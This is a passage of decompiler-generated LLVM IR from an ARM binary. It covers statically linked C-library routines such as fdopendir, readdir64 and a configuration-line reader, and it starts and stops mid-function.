dec_label_pc_19258:                               ; preds = %dec_label_pc_19250
  store i32 %v2_19228, i32* @r1, align 4
  %v0_1925c = call i32 @fstat()
  %v1_19260 = icmp slt i32 %v0_1925c, 0
  br i1 %v1_19260, label %dec_label_pc_19268, label %dec_label_pc_1927c

dec_label_pc_19268:                               ; preds = %dec_label_pc_19258
  br label %dec_label_pc_19274

dec_label_pc_19274:                               ; preds = %dec_label_pc_19268, %dec_label_pc_19250, %dec_label_pc_19240
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_192b8

dec_label_pc_1927c:                               ; preds = %dec_label_pc_19258
  %v0_19284 = load i32, i32* @r7, align 4
  %v3_19288 = call i32 @__GI___fcntl_nocancel(i32 %v0_19284, i32 2, i32 1)
  %v0_1928c = load i32, i32* @r7, align 4
  %v2_19294 = call i32 @fd_to_DIR(i32 %v0_1928c, i32 %tmp)
  store i32 %v2_19294, i32* %r4.global-to-local, align 4
  %v2_19298 = icmp eq i32 %v2_19294, 0
  br i1 %v2_19298, label %dec_label_pc_192a0, label %dec_label_pc_192b8

dec_label_pc_192a0:                               ; preds = %dec_label_pc_1927c
  %v0_192ac = call i32 @__GI___errno_location()
  %v2_192b4 = inttoptr i32 %v0_192ac to i32*
  store i32 12, i32* %v2_192b4, align 4
  %v0_192b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_192b8

dec_label_pc_192b8:                               ; preds = %dec_label_pc_1927c, %dec_label_pc_19274, %dec_label_pc_192a0
  %v0_192b8 = phi i32 [ %v2_19294, %dec_label_pc_1927c ], [ 0, %dec_label_pc_19274 ], [ %v0_192b8.pre, %dec_label_pc_192a0 ]
  ret i32 %v0_192b8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_192b8, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_192d0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_192d0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_192dc = call i32 @fstat()
  store i32 %v0_192dc, i32* @r5, align 4
  %v2_192e0 = icmp eq i32 %v0_192dc, 0
  br i1 %v2_192e0, label %dec_label_pc_192e8, label %dec_label_pc_19350

dec_label_pc_192e8:                               ; preds = %entry
  %v1_192ec = and i32 %tmp4, 61440
  store i32 %v1_192ec, i32* @r3, align 4
  %v7_192f0 = icmp eq i32 %v1_192ec, 16384
  br i1 %v7_192f0, label %dec_label_pc_19308, label %dec_label_pc_192f8

dec_label_pc_192f8:                               ; preds = %dec_label_pc_192e8
  %v0_192f8 = call i32 @__GI___errno_location()
  br label %dec_label_pc_19334

dec_label_pc_19308:                               ; preds = %dec_label_pc_192e8
  %v0_19308 = load i32, i32* @r4, align 4
  %v2_19310 = call i32 @__libc_fcntl(i32 %v0_19308, i32 3)
  %v7_19314 = icmp eq i32 %v2_19310, -1
  br i1 %v7_19314, label %dec_label_pc_19350, label %dec_label_pc_1931c

dec_label_pc_1931c:                               ; preds = %dec_label_pc_19308
  %v1_1931c = urem i32 %v2_19310, 4
  %v7_19320 = icmp eq i32 %v1_1931c, 1
  br i1 %v7_19320, label %dec_label_pc_19328, label %dec_label_pc_1933c

dec_label_pc_19328:                               ; preds = %dec_label_pc_1931c
  %v0_19328 = call i32 @__GI___errno_location()
  br label %dec_label_pc_19334

dec_label_pc_19334:                               ; preds = %dec_label_pc_192f8, %dec_label_pc_19328
  %storemerge2 = phi i32 [ %v0_192f8, %dec_label_pc_192f8 ], [ %v0_19328, %dec_label_pc_19328 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_192f8 ], [ 22, %dec_label_pc_19328 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_19334 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_19334, align 4
  %v0_19354.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19354

dec_label_pc_1933c:                               ; preds = %dec_label_pc_1931c
  %v0_1933c = load i32, i32* @r4, align 4
  %v2_19344 = call i32 @fd_to_DIR(i32 %v0_1933c, i32 %tmp)
  store i32 %v2_19344, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19354

dec_label_pc_19350:                               ; preds = %entry, %dec_label_pc_19308
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19354

dec_label_pc_19354:                               ; preds = %dec_label_pc_1933c, %dec_label_pc_19334, %dec_label_pc_19350
  %v0_19354 = phi i32 [ %v2_19344, %dec_label_pc_1933c ], [ %v0_19354.pre, %dec_label_pc_19334 ], [ 0, %dec_label_pc_19350 ]
  ret i32 %v0_19354

; uselistorder directives
  uselistorder i32 %v2_19310, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_19354, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19350, { 1, 0 }
  uselistorder label %dec_label_pc_19334, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  %v1_19378 = add i32 %tmp, 24
  store i32 %v1_19378, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_19390 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  store i32 %v4_19390, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19390)
  %v0_193a4 = load i32, i32* @r6, align 4
  %v2_193a4 = add i32 %v0_193a4, 20
  %v3_193a4 = inttoptr i32 %v2_193a4 to i32*
  %v4_193a4 = load i32, i32* %v3_193a4, align 4
  store i32 %v4_193a4, i32* %ip.global-to-local, align 4
  store i32 103344, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_193a4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_193b4

dec_label_pc_193b4:                               ; preds = %dec_label_pc_193e4, %entry
  %v0_193b4 = load i32, i32* @r5, align 4
  %v1_193b4 = add i32 %v0_193b4, 4
  %v2_193b4 = inttoptr i32 %v1_193b4 to i32*
  %v3_193b4 = load i32, i32* %v2_193b4, align 4
  %v4_193b4 = add i32 %v0_193b4, 8
  %v5_193b4 = inttoptr i32 %v4_193b4 to i32*
  %v6_193b4 = load i32, i32* %v5_193b4, align 4
  %tmp10 = icmp ugt i32 %v6_193b4, %v3_193b4
  br i1 %tmp10, label %dec_label_pc_193e4, label %dec_label_pc_193c0

dec_label_pc_193c0:                               ; preds = %dec_label_pc_193b4
  %v1_193c0 = inttoptr i32 %v0_193b4 to i32*
  %v2_193c0 = load i32, i32* %v1_193c0, align 4
  %v1_193c4 = add i32 %v0_193b4, 12
  %v2_193c4 = inttoptr i32 %v1_193c4 to i32*
  %v3_193c4 = load i32, i32* %v2_193c4, align 4
  %v1_193c8 = add i32 %v0_193b4, 20
  %v2_193c8 = inttoptr i32 %v1_193c8 to i32*
  %v3_193c8 = load i32, i32* %v2_193c8, align 4
  %v4_193cc = inttoptr i32 %v3_193c4 to i32*
  %v5_193cc = call i32 @__getdents64(i32 %v2_193c0, i32* %v4_193cc, i32 %v3_193c8, i32 %v6_193b4)
  %tmp9 = icmp slt i32 %v5_193cc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_193dc

.thread:                                          ; preds = %dec_label_pc_193c0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_19414

dec_label_pc_193dc:                               ; preds = %dec_label_pc_193c0
  %v1_193dc = load i32, i32* @r5, align 4
  %v2_193dc = add i32 %v1_193dc, 8
  %v3_193dc = inttoptr i32 %v2_193dc to i32*
  store i32 %v5_193cc, i32* %v3_193dc, align 4
  %v0_193e0 = load i32, i32* @r7, align 4
  %v1_193e0 = load i32, i32* @r5, align 4
  %v2_193e0 = add i32 %v1_193e0, 4
  %v3_193e0 = inttoptr i32 %v2_193e0 to i32*
  store i32 %v0_193e0, i32* %v3_193e0, align 4
  %v0_193e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193e4

dec_label_pc_193e4:                               ; preds = %dec_label_pc_193b4, %dec_label_pc_193dc
  %v1_19408 = phi i32 [ %v0_193b4, %dec_label_pc_193b4 ], [ %v0_193e4.pre, %dec_label_pc_193dc ]
  %v1_193e4 = add i32 %v1_19408, 4
  %v2_193e4 = inttoptr i32 %v1_193e4 to i32*
  %v3_193e4 = load i32, i32* %v2_193e4, align 4
  %v1_193e8 = add i32 %v1_19408, 12
  %v2_193e8 = inttoptr i32 %v1_193e8 to i32*
  %v3_193e8 = load i32, i32* %v2_193e8, align 4
  %v2_193ec = add i32 %v3_193e8, %v3_193e4
  store i32 %v2_193ec, i32* @r4, align 4
  %v3_193f0 = inttoptr i32 %v2_193ec to i32*
  %v4_193f0 = load i32, i32* %v3_193f0, align 4
  %v1_193f4 = add i32 %v2_193ec, 4
  %v2_193f4 = inttoptr i32 %v1_193f4 to i32*
  %v3_193f4 = load i32, i32* %v2_193f4, align 4
  %v1_193f8 = add i32 %v2_193ec, 16
  %v2_193f8 = inttoptr i32 %v1_193f8 to i16*
  %v3_193f8 = load i16, i16* %v2_193f8, align 2
  %v4_193f8 = zext i16 %v3_193f8 to i32
  %v1_193fc = add i32 %v2_193ec, 8
  %v2_193fc = inttoptr i32 %v1_193fc to i32*
  %v3_193fc = load i32, i32* %v2_193fc, align 4
  store i32 %v3_193fc, i32* %ip.global-to-local, align 4
  %v2_19400 = add i32 %v4_193f8, %v3_193e4
  %v2_19404 = or i32 %v3_193f4, %v4_193f0
  %v4_19404 = icmp eq i32 %v2_19404, 0
  store i32 %v2_19400, i32* %v2_193e4, align 4
  %v0_1940c = load i32, i32* %ip.global-to-local, align 4
  %v1_1940c = load i32, i32* @r5, align 4
  %v2_1940c = add i32 %v1_1940c, 16
  %v3_1940c = inttoptr i32 %v2_1940c to i32*
  store i32 %v0_1940c, i32* %v3_1940c, align 4
  br i1 %v4_19404, label %dec_label_pc_193b4, label %dec_label_pc_19414

dec_label_pc_19414:                               ; preds = %dec_label_pc_193e4, %.thread
  %v0_19420 = load i32, i32* @r6, align 4
  %v2_19420 = add i32 %v0_19420, 28
  %v3_19420 = inttoptr i32 %v2_19420 to i32*
  %v4_19420 = load i32, i32* %v3_19420, align 4
  store i32 %v4_19420, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19420)
  %v0_1942c = load i32, i32* @r4, align 4
  ret i32 %v0_1942c

; uselistorder directives
  uselistorder i32 %v2_193ec, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_19408, { 1, 0 }
  uselistorder i32 %v6_193b4, { 1, 0 }
  uselistorder i32 %v0_193b4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_193e4, { 1, 0 }
}

define i32 @function_19440(i32 %arg1) local_unnamed_addr {
dec_label_pc_19440:
  %v0_19440 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19440, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19440
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19440, %bb
  %v10_1944c = phi i32 [ %arg1, %dec_label_pc_19440 ], [ 0, %bb ]
  ret i32 %v10_1944c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 26308)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1946c = load i32, i32* @r4, align 4
  %v6_1946c = load i32, i32* @r5, align 4
  %v9_1946c = load i32, i32* @r6, align 4
  %v12_1946c = load i32, i32* @r7, align 4
  %v15_1946c = load i32, i32* @r8, align 4
  %v18_1946c = load i32, i32* @sb, align 4
  %v21_1946c = load i32, i32* @sl, align 4
  %v24_1946c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_19470 = icmp eq i32* %arg1, null
  store i1 %v2_19470, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_19470, label %dec_label_pc_19780, label %dec_label_pc_19488

dec_label_pc_19488:                               ; preds = %entry
  %v1_19488 = urem i32 %arg3, 256
  store i32 %v1_19488, i32* @sb, align 4
  %v1_1948c = udiv i32 %arg3, 256
  %v3_19490 = urem i32 %v1_1948c, 256
  %v3_19494 = mul nuw nsw i32 %v1_19488, 4
  %v1_1949c = or i32 %v3_19494, 1
  %v1_194a8 = and i32 %arg3, 131072
  %v1_194ac = add nsw i32 %v1_19488, -1
  %v1_194b8 = and i32 %arg3, 262144
  store i32 %v1_194b8, i32* %r2.global-to-local, align 4
  %v1_194bc = and i32 %arg3, 65536
  store i32 %v1_194bc, i32* %r3.global-to-local, align 4
  store i32 %v1_194bc, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_194cc = add i32 %arg4, 1
  store i32 %v1_194cc, i32* @sl, align 4
  %v2_1964c = inttoptr i32 %arg2 to i32*
  %v2_1965c = icmp eq i32 %v1_194a8, 0
  %v2_196b4 = icmp eq i32 %v1_194b8, 0
  br label %dec_label_pc_194d0

dec_label_pc_194d0:                               ; preds = %dec_label_pc_194d0.backedge, %dec_label_pc_19488
  %v2_194ec = phi i32 [ %v0_194d0.pre, %dec_label_pc_194d0.backedge ], [ %tmp, %dec_label_pc_19488 ]
  %v1_194d0 = add i32 %v2_194ec, 4
  %v2_194d0 = inttoptr i32 %v1_194d0 to i32*
  %v3_194d0 = load i32, i32* %v2_194d0, align 4
  store i32 %v3_194d0, i32* %r3.global-to-local, align 4
  %v2_194d4 = icmp eq i32 %v3_194d0, 0
  store i1 %v2_194d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194d4, label %dec_label_pc_194dc, label %dec_label_pc_19524

dec_label_pc_194dc:                               ; preds = %dec_label_pc_194d0
  %v1_194dc = add i32 %v2_194ec, 16
  %v2_194dc = inttoptr i32 %v1_194dc to i32*
  %v3_194dc = load i32, i32* %v2_194dc, align 4
  store i32 %v3_194dc, i32* %r3.global-to-local, align 4
  %v2_194e0 = icmp eq i32 %v3_194dc, 0
  store i1 %v2_194e0, i1* %cpsr_z.global-to-local, align 1
  %v1_194e4 = add i32 %v2_194ec, 8
  %v2_194e4 = inttoptr i32 %v1_194e4 to i32*
  %v3_194e4 = load i32, i32* %v2_194e4, align 4
  store i32 %v3_194e4, i32* %r3.global-to-local, align 4
  br i1 %v2_194e0, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_194dc
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_194dc, align 4
  %v0_194f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_194dc, %bb
  %v0_194f0 = phi i32 [ %v0_194f0.pre, %bb ], [ %v3_194e4, %dec_label_pc_194dc ]
  %v2_194f0 = icmp eq i32 %v0_194f0, 0
  store i1 %v2_194f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194f0, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_1949c, i32* %r3.global-to-local, align 4
  %v2_194f8 = load i32, i32* @r5, align 4
  %v3_194f8 = add i32 %v2_194f8, 8
  %v4_194f8 = inttoptr i32 %v3_194f8 to i32*
  store i32 %v1_1949c, i32* %v4_194f8, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_194fc = load i32, i32* @r5, align 4
  %v1_194fc = add i32 %v0_194fc, 16
  %v2_194fc = inttoptr i32 %v1_194fc to i32*
  %v3_194fc = load i32, i32* %v2_194fc, align 4
  store i32 %v3_194fc, i32* %r0.global-to-local, align 4
  %v1_19500 = add i32 %v0_194fc, 8
  %v2_19500 = inttoptr i32 %v1_19500 to i32*
  %v3_19500 = load i32, i32* %v2_19500, align 4
  store i32 %v3_19500, i32* %r3.global-to-local, align 4
  %v2_19504 = add i32 %v3_19500, %v3_194fc
  store i32 %v2_19504, i32* %r0.global-to-local, align 4
  %v1_19508 = call i32 @malloc(i32 %v2_19504)
  store i32 %v1_19508, i32* %r0.global-to-local, align 4
  %v2_1950c = icmp eq i32 %v1_19508, 0
  store i1 %v2_1950c, i1* %cpsr_z.global-to-local, align 1
  %v1_19510 = load i32, i32* @r5, align 4
  %v2_19510 = add i32 %v1_19510, 4
  %v3_19510 = inttoptr i32 %v2_19510 to i32*
  store i32 %v1_19508, i32* %v3_19510, align 4
  br i1 %v2_1950c, label %dec_label_pc_19780, label %dec_label_pc_19518

dec_label_pc_19518:                               ; preds = %.thread
  %v0_19518 = load i32, i32* @r5, align 4
  %v1_19518 = add i32 %v0_19518, 20
  %v2_19518 = inttoptr i32 %v1_19518 to i32*
  %v3_19518 = load i32, i32* %v2_19518, align 4
  %v1_1951c = or i32 %v3_19518, 1
  store i32 %v1_1951c, i32* %r3.global-to-local, align 4
  store i32 %v1_1951c, i32* %v2_19518, align 4
  %v0_19524.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19524

dec_label_pc_19524:                               ; preds = %dec_label_pc_194d0, %dec_label_pc_19518
  %v1_1952c = phi i32 [ %v2_194ec, %dec_label_pc_194d0 ], [ %v0_19524.pre, %dec_label_pc_19518 ]
  %v1_19524 = add i32 %v1_1952c, 4
  %v2_19524 = inttoptr i32 %v1_19524 to i32*
  %v3_19524 = load i32, i32* %v2_19524, align 4
  store i32 %v3_19524, i32* %r2.global-to-local, align 4
  %v4_19524 = add i32 %v1_1952c, 8
  %v5_19524 = inttoptr i32 %v4_19524 to i32*
  %v6_19524 = load i32, i32* %v5_19524, align 4
  %v2_19528 = add i32 %v6_19524, %v3_19524
  store i32 %v2_19528, i32* %r3.global-to-local, align 4
  %v2_1952c = add i32 %v1_1952c, 12
  %v3_1952c = inttoptr i32 %v2_1952c to i32*
  store i32 %v2_19528, i32* %v3_1952c, align 4
  %v0_19530 = load i32, i32* @fp, align 4
  store i32 %v0_19530, i32* @r6, align 4
  br label %dec_label_pc_19534

dec_label_pc_19534:                               ; preds = %dec_label_pc_195c0, %dec_label_pc_195ac, %dec_label_pc_19524
  %v0_1953c = phi i32 [ %v0_19530, %dec_label_pc_19524 ], [ %v1_195ac, %dec_label_pc_195ac ], [ %v0_1953c.pre.pre, %dec_label_pc_195c0 ]
  %v0_19534 = load i32, i32* @r5, align 4
  %v1_19534 = add i32 %v0_19534, 12
  store i32 %v1_19534, i32* %r0.global-to-local, align 4
  %v1_19538 = inttoptr i32 %v1_19534 to i32*
  %v2_19538 = load i32, i32* %v1_19538, align 4
  store i32 %v2_19538, i32* %r0.global-to-local, align 4
  %v3_19538 = add i32 %v0_19534, 16
  %v4_19538 = inttoptr i32 %v3_19538 to i32*
  %v5_19538 = load i32, i32* %v4_19538, align 4
  %v2_1953c = add i32 %v2_19538, %v0_1953c
  store i32 %v2_1953c, i32* %r0.global-to-local, align 4
  %v2_19540 = sub i32 %v5_19538, %v0_1953c
  %v1_19544 = inttoptr i32 %v0_19534 to i32*
  %v2_19544 = load i32, i32* %v1_19544, align 4
  store i32 %v2_19544, i32* %r2.global-to-local, align 4
  %v3_19548 = call i32 @fgets(i32 %v2_1953c, i32 %v2_19540, i32 %v2_19544)
  store i32 %v3_19548, i32* %r0.global-to-local, align 4
  store i32 %v3_19548, i32* %r4.global-to-local, align 4
  %v2_1954c = icmp eq i32 %v3_19548, 0
  store i1 %v2_1954c, i1* %cpsr_z.global-to-local, align 1
  %v0_19554 = load i32, i32* @r5, align 4
  %v1_19554 = add i32 %v0_19554, 12
  br i1 %v2_1954c, label %dec_label_pc_19554, label %dec_label_pc_1956c

dec_label_pc_19554:                               ; preds = %dec_label_pc_19534
  store i32 %v1_19554, i32* %r0.global-to-local, align 4
  %v1_19558 = inttoptr i32 %v1_19554 to i32*
  %v2_19558 = load i32, i32* %v1_19558, align 4
  store i32 %v2_19558, i32* %r0.global-to-local, align 4
  %v3_19558 = add i32 %v0_19554, 16
  %v4_19558 = inttoptr i32 %v3_19558 to i32*
  %v5_19558 = load i32, i32* %v4_19558, align 4
  store i32 %v5_19558, i32* @r2, align 4
  %v2_19560 = inttoptr i32 %v2_19558 to i8*
  %v3_19560 = call i32 @__GI_memset(i8* %v2_19560, i32 0)
  store i32 %v3_19560, i32* %r0.global-to-local, align 4
  %v0_19564 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19784

dec_label_pc_1956c:                               ; preds = %dec_label_pc_19534
  %v2_1956c = inttoptr i32 %v1_19554 to i32*
  %v3_1956c = load i32, i32* %v2_1956c, align 4
  store i32 %v3_1956c, i32* @r4, align 4
  %v1_19570 = load i32, i32* @r6, align 4
  %v2_19570 = add i32 %v1_19570, %v3_1956c
  %v3_19570 = inttoptr i32 %v2_19570 to i8*
  store i32 %v2_19570, i32* %r0.global-to-local, align 4
  %v3_19574 = call i32 @strlen(i8* %v3_19570)
  %v0_1957c = load i32, i32* @r6, align 4
  %v2_1957c = add i32 %v0_1957c, %v3_19574
  store i32 %v2_1957c, i32* @r6, align 4
  %v0_19580 = load i32, i32* @r4, align 4
  store i32 %v0_19580, i32* @r0, align 4
  %v2_19584 = call i32 @__GI_strchr(i32 %v0_19580, i32 10)
  store i32 %v2_19584, i32* %r0.global-to-local, align 4
  %v2_19588 = icmp eq i32 %v2_19584, 0
  store i1 %v2_19588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19588, label %dec_label_pc_195b4, label %dec_label_pc_19590

dec_label_pc_19590:                               ; preds = %dec_label_pc_1956c
  %v1_19590 = inttoptr i32 %v2_19584 to i8*
  %v2_19590 = load i8, i8* %v1_19590, align 1
  %v3_19590 = zext i8 %v2_19590 to i32
  %v1_19594 = add nuw nsw i32 %v3_19590, 255
  %v1_19598 = urem i32 %v1_19594, 256
  store i32 %v1_19598, i32* %r3.global-to-local, align 4
  %v7_1959c = icmp eq i32 %v1_19598, 92
  store i1 %v7_1959c, i1* %cpsr_z.global-to-local, align 1
  %v1_195a0 = trunc i32 %v1_19594 to i8
  store i8 %v1_195a0, i8* %v1_19590, align 1
  %v0_195a4 = load i32, i32* @r6, align 4
  %v1_195a4 = add i32 %v0_195a4, -1
  store i32 %v1_195a4, i32* @r6, align 4
  %v0_195a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_195a8, label %dec_label_pc_195ac, label %dec_label_pc_19638

dec_label_pc_195ac:                               ; preds = %dec_label_pc_19590
  %v1_195ac = add i32 %v0_195a4, -2
  store i32 %v1_195ac, i32* @r6, align 4
  br label %dec_label_pc_19534

dec_label_pc_195b4:                               ; preds = %dec_label_pc_1956c
  %v0_195b4 = load i32, i32* @r5, align 4
  %v1_195b4 = add i32 %v0_195b4, 20
  %v2_195b4 = inttoptr i32 %v1_195b4 to i32*
  %v3_195b4 = load i32, i32* %v2_195b4, align 4
  store i32 %v3_195b4, i32* %r3.global-to-local, align 4
  %v2_195b8 = icmp eq i32 %v3_195b4, 0
  store i1 %v2_195b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195b8, label %dec_label_pc_195f0, label %dec_label_pc_195c0

dec_label_pc_195c0:                               ; preds = %dec_label_pc_195b4
  %v1_195c0 = add i32 %v0_195b4, 16
  %v2_195c0 = inttoptr i32 %v1_195c0 to i32*
  %v3_195c0 = load i32, i32* %v2_195c0, align 4
  store i32 %v3_195c0, i32* %r3.global-to-local, align 4
  %v1_195c4 = add i32 %v0_195b4, 8
  %v2_195c4 = inttoptr i32 %v1_195c4 to i32*
  %v3_195c4 = load i32, i32* %v2_195c4, align 4
  %v1_195c8 = add i32 %v3_195c0, 4096
  store i32 %v1_195c8, i32* %r3.global-to-local, align 4
  %v2_195cc = add i32 %v3_195c4, %v1_195c8
  store i32 %v1_195c8, i32* %v2_195c0, align 4
  %v0_195d4 = load i32, i32* @r5, align 4
  %v1_195d4 = add i32 %v0_195d4, 4
  %v2_195d4 = inttoptr i32 %v1_195d4 to i32*
  %v3_195d4 = load i32, i32* %v2_195d4, align 4
  store i32 %v3_195d4, i32* %r0.global-to-local, align 4
  %v2_195d8 = inttoptr i32 %v3_195d4 to i32*
  %v3_195d8 = call i32 @realloc(i32* %v2_195d8, i32 %v2_195cc)
  store i32 %v3_195d8, i32* %r0.global-to-local, align 4
  %v0_195dc = load i32, i32* @r5, align 4
  %v1_195dc = add i32 %v0_195dc, 8
  %v2_195dc = inttoptr i32 %v1_195dc to i32*
  %v3_195dc = load i32, i32* %v2_195dc, align 4
  %v2_195e0 = add i32 %v3_195dc, %v3_195d8
  store i32 %v2_195e0, i32* %r3.global-to-local, align 4
  %v2_195e4 = add i32 %v0_195dc, 12
  %v3_195e4 = inttoptr i32 %v2_195e4 to i32*
  store i32 %v2_195e0, i32* %v3_195e4, align 4
  %v1_195e8 = load i32, i32* @r5, align 4
  %v2_195e8 = add i32 %v1_195e8, 4
  %v3_195e8 = inttoptr i32 %v2_195e8 to i32*
  store i32 %v3_195d8, i32* %v3_195e8, align 4
  %v0_1953c.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19534

dec_label_pc_195f0:                               ; preds = %dec_label_pc_195b4, %.dec_label_pc_195f0_crit_edge
  %v0_195f0 = phi i32 [ %v0_195f0.pre, %.dec_label_pc_195f0_crit_edge ], [ %v0_195b4, %dec_label_pc_195b4 ]
  %v1_195f0 = inttoptr i32 %v0_195f0 to i32*
  %v2_195f0 = load i32, i32* %v1_195f0, align 4
  %v1_195f4 = add i32 %v2_195f0, 52
  %v2_195f4 = inttoptr i32 %v1_195f4 to i32*
  %v3_195f4 = load i32, i32* %v2_195f4, align 4
  store i32 %v3_195f4, i32* %r3.global-to-local, align 4
  %v2_195f8 = icmp eq i32 %v3_195f4, 0
  store i1 %v2_195f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195f8, label %dec_label_pc_19624, label %dec_label_pc_19600

dec_label_pc_19600:                               ; preds = %dec_label_pc_195f0
  %v1_19600 = add i32 %v2_195f0, 16
  %v2_19600 = inttoptr i32 %v1_19600 to i32*
  %v3_19600 = load i32, i32* %v2_19600, align 4
  store i32 %v3_19600, i32* %r2.global-to-local, align 4
  %v1_19604 = add i32 %v2_195f0, 24
  %v2_19604 = inttoptr i32 %v1_19604 to i32*
  %v3_19604 = load i32, i32* %v2_19604, align 4
  store i32 %v3_19604, i32* %r3.global-to-local, align 4
  %v3_19608 = icmp ult i32 %v3_19600, %v3_19604
  %v9_19608 = icmp eq i32 %v3_19600, %v3_19604
  store i1 %v9_19608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19608, label %dec_label_pc_1962cthread-pre-split, label %dec_label_pc_19618

dec_label_pc_19618:                               ; preds = %dec_label_pc_19600
  store i32 %v2_195f0, i32* %r0.global-to-local, align 4
  %v1_1961c = inttoptr i32 %v2_195f0 to i16*
  %v2_1961c = call i32 @getc_unlocked(i16* %v1_1961c)
  store i32 %v2_1961c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_19624:                               ; preds = %dec_label_pc_195f0
  store i32 %v2_195f0, i32* %r0.global-to-local, align 4
  %v1_19628 = call i32 @__GI_fgetc(i32 %v2_195f0)
  store i32 %v1_19628, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_1962cthread-pre-split:               ; preds = %dec_label_pc_19600
  %v2_1960c = inttoptr i32 %v3_19600 to i8*
  %v3_1960c = load i8, i8* %v2_1960c, align 1
  %v4_1960c = zext i8 %v3_1960c to i32
  store i32 %v4_1960c, i32* %r0.global-to-local, align 4
  %v6_1960c = add i32 %v3_19600, 1
  store i32 %v6_1960c, i32* %r2.global-to-local, align 4
  store i32 %v6_1960c, i32* %v2_19600, align 4
  %v0_1962c.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_1962c:                               ; preds = %dec_label_pc_1962cthread-pre-split, %dec_label_pc_19618, %dec_label_pc_19624
  %v1_19630 = phi i32 [ %v0_1962c.pr, %dec_label_pc_1962cthread-pre-split ], [ %v2_1961c, %dec_label_pc_19618 ], [ %v1_19628, %dec_label_pc_19624 ]
  %v7_1962c = icmp eq i32 %v1_19630, 10
  store i1 %v7_1962c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1962c, label %dec_label_pc_19638.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_1962c
  %v8_19630 = icmp eq i32 %v1_19630, -1
  store i1 %v8_19630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19630, label %dec_label_pc_19638.loopexit, label %.dec_label_pc_195f0_crit_edge

.dec_label_pc_195f0_crit_edge:                    ; preds = %bb68
